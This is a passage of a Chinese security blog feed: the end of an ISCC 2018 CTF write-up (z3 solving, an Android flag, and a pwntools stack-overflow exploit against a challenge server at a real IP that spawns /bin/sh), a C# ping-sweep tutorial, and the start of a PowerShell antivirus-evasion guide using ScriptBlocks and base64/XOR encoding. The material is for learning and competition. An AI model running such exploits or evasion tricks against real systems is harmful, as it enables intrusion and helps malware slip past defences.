2):</span><br><span class="line">    result += chr((int(flag[i:i+2], 16)))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h3 id="My-math-is-bad"><a href="#My-math-is-bad" class="headerlink" title="My math is bad"></a>My math is bad</h3><p>程序地址：<a href="https://pan.baidu.com/s/10q1OftjPKjON15Ijs_RCdw" target="_blank" rel="noopener">My math is bad</a></p><p>题目：I think the math problem is too difficult for me.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file Reverse</span><br><span class="line">Reverse: ELF 64-bit LSB executable, x86-64, version  1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=20b7dc66633da72204852bf32a4e0c4ea46340b6, stripped</span><br></pre></td></tr></table></figure><p>IDA又是不显示main函数</p><p><img src="/image/ISCC-2018/Re2.png" alt=""></p><p>满足<code>sub_400766()</code>就输出<code>sub_400B16()</code>，那就，直接看<code>sub_400B16()</code> ？看了看，不行哦，捷径走不了，那就看<code>sub_400766()</code>里的东西。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">if ( strlen(s) == 32 )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = unk_6020B0;</span><br><span class="line">  v4 = unk_6020B4;</span><br><span class="line">  v5 = unk_6020B8;</span><br><span class="line">  v6 = unk_6020BC;</span><br><span class="line">  result = 0;</span><br><span class="line">  if ( dword_6020A4 * (signed __int64)*(signed int *)s - dword_6020AC * (signed __int64)dword_6020A8 == 2652042832920173142LL</span><br><span class="line">    &amp;&amp; 3LL * dword_6020A8 + 4LL * dword_6020AC - dword_6020A4 - 2LL * *(signed int *)s == 397958918</span><br><span class="line">    &amp;&amp; 3 * *(signed int *)s * (signed __int64)dword_6020AC - dword_6020A8 * (signed __int64)dword_6020A4 == 3345692380376715070LL</span><br><span class="line">    &amp;&amp; 27LL * dword_6020A4 + *(signed int *)s - 11LL * dword_6020AC - dword_6020A8 == 40179413815LL )</span><br><span class="line">  &#123;</span><br><span class="line">    srand(dword_6020A8 ^ dword_6020A4 ^ *(_DWORD *)s ^ dword_6020AC);</span><br><span class="line">    v1 = rand() % 50;</span><br><span class="line">    v2 = rand() % 50;</span><br><span class="line">    v7 = rand() % 50;</span><br><span class="line">    v8 = rand() % 50;</span><br><span class="line">    v9 = rand() % 50;</span><br><span class="line">    v10 = rand() % 50;</span><br><span class="line">    v11 = rand() % 50;</span><br><span class="line">    v12 = rand() % 50;</span><br><span class="line">    if ( v6 * v2 + v3 * v1 - v4 - v5 == 61799700179LL</span><br><span class="line">      &amp;&amp; v6 + v3 + v5 * v8 - v4 * v7 == 48753725643LL</span><br><span class="line">      &amp;&amp; v3 * v9 + v4 * v10 - v5 - v6 == 59322698861LL</span><br><span class="line">      &amp;&amp; v5 * v12 + v3 - v4 - v6 * v11 == 51664230587LL )</span><br><span class="line">      result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合动态分析，程序先判断输入值长度是否为32位，接下来将输入值进行拆分成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s、dword_6020A4、dword_6020A8、dword_6020AC、</span><br><span class="line">unk_6020B0(v3)、unk_6020B4(v4)、unk_6020B8(v5)、unk_6020BC(v6)</span><br></pre></td></tr></table></figure><p>依次验证，满足条件即返回1，则通过校验。</p><p>详细看看第8-13行，4个未知数和四个方程，emmm。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword_6020A4 *s - dword_6020AC * dword_6020A8 == 2652042832920173142</span><br><span class="line">3 * dword_6020A8 + 4 * dword_6020AC - dword_6020A4 - 2 * s == 397958918</span><br><span class="line">3 * s * dword_6020AC - dword_6020A8 * dword_6020A4 == 3345692380376715070</span><br><span class="line">27 * dword_6020A4 + s - 11 * dword_6020AC - dword_6020A8 == 40179413815</span><br></pre></td></tr></table></figure><p>利用python的<code>z3</code>库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">dword_6020A4 = Int(&apos;dword_6020A4&apos;)</span><br><span class="line">dword_6020AC = Int(&apos;dword_6020AC&apos;)</span><br><span class="line">dword_6020A8 = Int(&apos;dword_6020A8&apos;)</span><br><span class="line">s = Int(&apos;s&apos;)</span><br><span class="line"></span><br><span class="line">solve(dword_6020A4 * s - dword_6020AC * dword_6020A8 == 2652042832920173142 ,</span><br><span class="line">    3 * dword_6020A8 + 4 * dword_6020AC - dword_6020A4 - 2 * s == 397958918 ,</span><br><span class="line">    3 * s * dword_6020AC - dword_6020A8 * dword_6020A4 == 3345692380376715070 ,</span><br><span class="line">    27 * dword_6020A4 +  s - 11 * dword_6020AC - dword_6020A8 == 40179413815 )</span><br><span class="line">运算结果：</span><br><span class="line">s = 1869639009</span><br><span class="line">dword_6020A4 = 1801073242</span><br><span class="line">dword_6020A8 = 829124174</span><br><span class="line">dword_6020AC = 862734414</span><br></pre></td></tr></table></figure><p>接下来到异或运算，直接用<code>C语言</code>吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int v1,v2,v7,v8,v9,v10,v11,v12;</span><br><span class="line"></span><br><span class="line">int main(void) &#123; </span><br><span class="line">srand(829124174 ^ 1801073242 ^ 1869639009 ^ 862734414);</span><br><span class="line">    v1 = rand() % 50;</span><br><span class="line">    v2 = rand() % 50;</span><br><span class="line">    v7 = rand() % 50;</span><br><span class="line">    v8 = rand() % 50;</span><br><span class="line">    v9 = rand() % 50;</span><br><span class="line">    v10 = rand() % 50;</span><br><span class="line">    v11 = rand() % 50;</span><br><span class="line">    v12 = rand() % 50;</span><br><span class="line">printf(&quot; v1=%d \n v2=%d \n V7=%d \n v8=%d \n v9=%d \n v10=%d \n v11=%d \n v12=%d&quot;,v1,v2,v7,v8,v9,v10,v11,v12);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">运算结果：</span><br><span class="line">v1=22 </span><br><span class="line">v2=39 </span><br><span class="line">V7=45 </span><br><span class="line">v8=45 </span><br><span class="line">v9=35 </span><br><span class="line">v10=41 </span><br><span class="line">v11=13 </span><br><span class="line">v12=36</span><br></pre></td></tr></table></figure><p>然后继续接下来的方程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">v3 = Int(&apos;v3&apos;)</span><br><span class="line">v4 = Int(&apos;v4&apos;)</span><br><span class="line">v5 = Int(&apos;v5&apos;)</span><br><span class="line">v6 = Int(&apos;v6&apos;)</span><br><span class="line"></span><br><span class="line">solve(v6 * 39 + v3 * 22 - v4 - v5 == 61799700179,</span><br><span class="line">v6 + v3 + v5 * 45 - v4 * 45 == 48753725643,</span><br><span class="line">v3 * 35 + v4 * 41 - v5 - v6 == 59322698861,</span><br><span class="line">v5 * 36 + v3 - v4 - v6 * 13 == 51664230587,)</span><br><span class="line">运算结果：</span><br><span class="line">v3 = 811816014</span><br><span class="line">v4 = 828593230</span><br><span class="line">v5 = 1867395930</span><br><span class="line">v6 = 1195788129</span><br></pre></td></tr></table></figure><p>将数字串转换成字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">x = [1869639009,1801073242,829124174,862734414,811816014,828593230,1867395930,1195788129]</span><br><span class="line">for y in x:</span><br><span class="line">    flag += libnum.n2s(y)[::-1]</span><br><span class="line">    print flag</span><br><span class="line">运算结果：</span><br><span class="line">ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG</span><br></pre></td></tr></table></figure><p>得出正确的输入值，输入输出</p><p><img src="/image/ISCC-2018/Re2-1.png" alt=""></p><h2 id="0x04-PWN"><a href="#0x04-PWN" class="headerlink" title="0x04 PWN"></a>0x04 PWN</h2><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>题目：nc 47.104.16.75 9000</p><p>程序地址：<a href="https://pan.baidu.com/s/1fcY68iZ-gZqyF9x-njScKA" target="_blank" rel="noopener">Pwn-Login</a></p><p>下载附件倒入<code>IDA</code>进行分析</p><p>程序运行过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main()--&gt;Login()--&gt;Menu()--&gt;ExecCmd()--&gt;ShowUserlist()...</span><br></pre></td></tr></table></figure><p>查看<code>Login()</code>内容，总的看没什么特别的，接下来看<code>Menu()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax@6</span><br><span class="line">  char buf[68]; // [sp+0h] [bp-50h]@1</span><br><span class="line">  int v2; // [sp+44h] [bp-Ch]@2</span><br><span class="line">  __int64 v3; // [sp+48h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  memset(buf, 0, 0x40uLL);</span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;\nPanel\n\n1. exec command\n2. show user list\n3. exit\n&quot;);</span><br><span class="line">        printf(&quot;Your choice: &quot;);</span><br><span class="line">        fflush(_bss_start);</span><br><span class="line">        v2 = read(0, buf, 0x280uLL);</span><br><span class="line">        buf[v2] = 0;</span><br><span class="line">        if ( buf[0] != 49 )</span><br><span class="line">          break;</span><br><span class="line">        ExecCmd();</span><br><span class="line">      &#125;</span><br><span class="line">      if ( buf[0] != 50 )</span><br><span class="line">        break;</span><br><span class="line">      ShowUserlist(0LL, buf);</span><br><span class="line">    &#125;</span><br><span class="line">    result = (unsigned __int8)buf[0];</span><br><span class="line">  &#125;</span><br><span class="line">  while ( buf[0] != 51 );</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure><p>注意看第18行的代码。非常简单，单纯的读取一串字符串，然后储存在<code>buf</code>里面，但是，开辟的缓存区只有<code>0x50</code>字节大小，但是<code>read</code>最多可以读取<code>0x280</code>字节大小，这样就会造成缓存区溢出，也就是栈溢出漏洞。</p><p>接下来再看<code>ExecCmd()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int ExecCmd()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax@2</span><br><span class="line">  char *v1; // [sp+0h] [bp-10h]@3</span><br><span class="line"></span><br><span class="line">  if ( !strcmp(strUsername, &quot;admin&quot;) ) //判断是否为admin用户</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Command: &quot;, &quot;admin&quot;, 0LL);</span><br><span class="line">    fflush(_bss_start);</span><br><span class="line">    fgets(cmd, 255, stdin);</span><br><span class="line">    v1 = strchr(cmd, 10);</span><br><span class="line">    if ( v1 )</span><br><span class="line">      *v1 = 0;</span><br><span class="line">    result = puts(&quot;Sorry, this feature has been disabled.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = puts(&quot;Sorry, this feature is only available for admin&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们要做的：如下图，程序不经过红框内，直接跳过输出。</p><p><img src="/image/ISCC-2018/Pwn1.png" alt=""></p><p>也就是将<code>return</code>修改到<code>call system</code>，记住交互的最后还得输入一个3退出while循环</p><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = remote(&apos;47.104.16.75&apos;,9000)</span><br><span class="line">#p = process(&apos;./pwn50&apos;)</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(&quot;admin&quot;)              #Send username</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(&quot;T6OBSh2i&quot;)       #Send password</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)                        #Choose 1. exec command</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)            #Send cmd</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.sendline(&quot;\x90&quot;*0x58 + p64(0x40084A))       #Change return address</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag{welcome_to_iscc}</p><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><h3 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h3><p>附件地址：<a href="https://pan.baidu.com/s/1cWKBmVl1xTiaSWaODt5Rlw" target="_blank" rel="noopener">小试牛刀</a></p><p>拖进<code>JEB2</code>，查看<code>Manifest</code>、<code>action</code>等基础信息。这道题的坑就是壳的问题。</p><p><img src="/image/ISCC-2018/Mobile1.png" alt=""></p><p>后来发现，<code>Assets</code>中的<code>bfsprotect.jar</code>就是源码。</p><p><img src="/image/ISCC-2018/Mobile1-1.png" alt=""></p><p>右键<code>MainActivity</code>选择<code>Decompile</code>查看源码，一览无遗。</p><p>在<code>onCreate()</code>中发现了下面这个判断，与APP页面的判断显示一致。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public void onClick(View arg5) &#123;</span><br><span class="line">                if(!new ProtectClass().protectMethod(MainActivity.this.editText.getText().toString())) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.this, &quot;Wrong Flag&quot;, 0).show();</span><br><span class="line">                &#125;</span><br><span class="line">                else &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.this, &quot;Correct Flag&quot;, 0).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>进入<code>ProtectClass()</code>查看，就能看到对比的值，也就是flag值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public boolean protectMethod(String arg4) &#123;</span><br><span class="line">    int v1;</span><br><span class="line">    for(v1 = 0; v1 &lt; MainActivity.runTimes &gt;&gt; 1; ++v1) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return arg4.equals(&quot;BFS-ISCC&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者，打开<code>bfsprotect.jar</code>，直接搜索<code>iscc</code>即可得到flag</p><p><img src="/image/ISCC-2018/Mobile1-2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;又一年，不过今年的质量有些…..&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://rcoil.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://rcoil.me/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://rcoil.me/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>C段ping操作（C#入门）</title>
    <link href="https://rcoil.me/2018/04/C%E6%AE%B5ping%E6%93%8D%E4%BD%9C/"/>
    <id>https://rcoil.me/2018/04/C段ping操作/</id>
    <published>2018-04-14T06:37:56.000Z</published>
    <updated>2018-04-24T13:07:56.961Z</updated>
    
    <content type="html"><![CDATA[<p>利用周末，造个轮子，学习C#！！</p><a id="more"></a><h2 id="官方examples"><a href="#官方examples" class="headerlink" title="官方examples"></a>官方examples</h2><p>查看官方的Ping类，已经很成熟了。以下为官方<code>examples</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static void Main (string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Ping pingSender = new Ping ();</span><br><span class="line">            PingOptions options = new PingOptions ();</span><br><span class="line"></span><br><span class="line">            // Use the default Ttl value which is 128,</span><br><span class="line">            // but change the fragmentation behavior.</span><br><span class="line">            options.DontFragment = true;</span><br><span class="line"></span><br><span class="line">            // Create a buffer of 32 bytes of data to be transmitted.</span><br><span class="line">            string data = &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class="line">            byte[] buffer = Encoding.ASCII.GetBytes (data);</span><br><span class="line">            int timeout = 120;</span><br><span class="line">            PingReply reply = pingSender.Send (args[0], timeout, buffer, options);</span><br><span class="line">            if (reply.Status == IPStatus.Success)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine (&quot;Address: &#123;0&#125;&quot;, reply.Address.ToString ());</span><br><span class="line">                Console.WriteLine (&quot;RoundTrip time: &#123;0&#125;&quot;, reply.RoundtripTime);</span><br><span class="line">                Console.WriteLine (&quot;Time to live: &#123;0&#125;&quot;, reply.Options.Ttl);</span><br><span class="line">                Console.WriteLine (&quot;Don&apos;t fragment: &#123;0&#125;&quot;, reply.Options.DontFragment);</span><br><span class="line">                Console.WriteLine (&quot;Buffer size: &#123;0&#125;&quot;, reply.Buffer.Length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/image/C段ping操作/examples.png" alt=""></p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><h3 id="数据显示"><a href="#数据显示" class="headerlink" title="数据显示"></a>数据显示</h3><p>官方demo中使用的是默认的<code>Ttl</code>（128），那接下来也使用这个默认值。对demo进行修改，显示所需要的信息即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Console.WriteLine (&quot;Address: &#123;0&#125;&quot;, reply.Address.ToString ());</span><br><span class="line">Console.WriteLine (&quot;HostName: &#123;0&#125;&quot;, Dns.GetHostEntry(reply.Address.ToString()).HostName);</span><br><span class="line">Console.WriteLine (&quot;Time to live: &#123;0&#125;&quot;, reply.Options.Ttl);</span><br></pre></td></tr></table></figure><p>这只能识别windows系统的，毕竟是128。emmm。</p><p><img src="/image/C段ping操作/hostname.png" alt=""></p><h3 id="正则匹配IP"><a href="#正则匹配IP" class="headerlink" title="正则匹配IP"></a>正则匹配IP</h3><p>使用正则去匹配输入的IP地址是否合理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// IP地址</span><br><span class="line">Regex regex = new Regex(@&quot;\d+\.\d+\.\d+\.\d+&quot;);// (提取IP地址时有用)</span><br><span class="line">// IP地址</span><br><span class="line">Regex regex = new Regex(@&quot;((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))&quot;);</span><br><span class="line">// IP地址</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>调用处理：</p><p><img src="/image/C段ping操作/regex-1.png" alt=""></p><p>效果：</p><p><img src="/image/C段ping操作/regex.png" alt=""></p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>流程：输入–&gt; 判断IP格式（处理）–&gt;遍历（ToString）–&gt;Ping()–&gt;输出–&gt;结束</p><p><img src="/image/C段ping操作/demo.png" alt=""></p><p>项目地址：<a href="https://github.com/RcoIl/cping" target="_blank" rel="noopener"><i class="fab fa-github" icon-2x=""></i></a></p><p>【参考】</p><p><a href="https://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping(v=vs.110).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping(v=vs.110).aspx</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;利用周末，造个轮子，学习C#！！&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="tools" scheme="https://rcoil.me/tags/tools/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】PowerShell免杀（一）</title>
    <link href="https://rcoil.me/2018/04/%E3%80%90%E5%85%8D%E6%9D%80%E3%80%91PowerShell%E5%85%8D%E6%9D%80%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://rcoil.me/2018/04/【免杀】PowerShell免杀（一）/</id>
    <published>2018-04-11T07:23:41.000Z</published>
    <updated>2018-11-26T08:00:42.501Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看免杀<br><a id="more"></a></p><h2 id="0x00-代码块"><a href="#0x00-代码块" class="headerlink" title="0x00 代码块"></a>0x00 代码块</h2><p>可以使用<code>PowerShell</code>的一个语言特性做通用免杀，那就是代码块（即<code>ScriptBlock</code>）。</p><p>代码块是一段可以被执行的PowerShell代码，通常是把代码块直接放在闭合的大括号中，类似函数<code>function</code>，带上代码块更加灵活，可以作为函数参数传递，也可以动态生成和调用。若想在PowerShell中动态创建代码块，首先得知道如何将一段字符串换成代码块对象。<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$scriptblock</span> = [SriptBlock]::Create(<span class="string">'notepad'</span>)</span><br></pre></td></tr></table></figure></p><p>先是字符串，然后转换成代码块对象，当然这个字符串也可以是变量。</p><p>调用方法：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="variable">$scriptblock</span></span><br><span class="line">或者可以直接</span><br><span class="line"><span class="built_in">Invoke-Command</span> -ScriptBlock ([ScriptBlock]::Create(<span class="string">'notepad'</span>))</span><br><span class="line">代码块操作操作符(&amp;)</span><br><span class="line">&amp;<span class="variable">$scriptblock</span></span><br></pre></td></tr></table></figure></p><h2 id="0x01-加解密"><a href="#0x01-加解密" class="headerlink" title="0x01 加解密"></a>0x01 加解密</h2><p>先对家吗进行加密，再加密执行</p><p>说到加密，最先想到的就是<code>base64</code>的编码加密了，既然容易想到，那就容易被杀。实现：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">"RcoIl"</span></span><br><span class="line"><span class="comment"># $str = [System.IO.File]::ReadAllText("C:\Users\allen\Desktop\payload.ps1");</span></span><br><span class="line"><span class="variable">$bytes</span> = [System.Text.Encoding]::Ascii.GetBytes(<span class="variable">$str</span>) <span class="comment"># 编码方式变一下也无所谓</span></span><br><span class="line"><span class="variable">$encode</span> = [Convert]::ToBase64String(<span class="variable">$bytes</span>)  <span class="comment"># 加密</span></span><br><span class="line"><span class="variable">$encode</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$decode</span> =[Convert]::FromBase64String(<span class="variable">$encode</span>); <span class="comment">#解密</span></span><br><span class="line"><span class="variable">$byte</span> = [System.Text.Encoding]::Ascii.GetString(<span class="variable">$decode</span>)</span><br><span class="line"><span class="variable">$byte</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">PS C:\Users\allen\Desktop&gt; .\demo.ps1</span><br><span class="line">UmNvSWw=</span><br><span class="line">RcoIl</span><br></pre></td></tr></table></figure></p><p>加上异或<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td 